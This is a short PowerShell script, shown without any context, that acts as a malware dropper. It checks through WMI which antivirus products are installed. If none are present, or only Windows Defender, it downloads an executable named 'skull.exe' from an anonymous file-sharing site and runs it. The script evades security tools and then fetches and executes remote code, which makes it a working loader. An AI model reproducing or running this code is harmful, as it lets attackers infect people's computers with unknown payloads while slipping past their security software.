$temp = "$temp\skull.exe"; 
$av = Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"; 
if (($av.Count -eq 0) -or ($av.DisplayName -eq "Windows Defender")) { 
    if (-not (Test-Path $temp)) { 
        Invoke-WebRequest "https://anonsharing.com/file/6588f00960e4d27f/a_(3).exe" -OutFile $temp 
    } 
    Start-Process $temp 
}
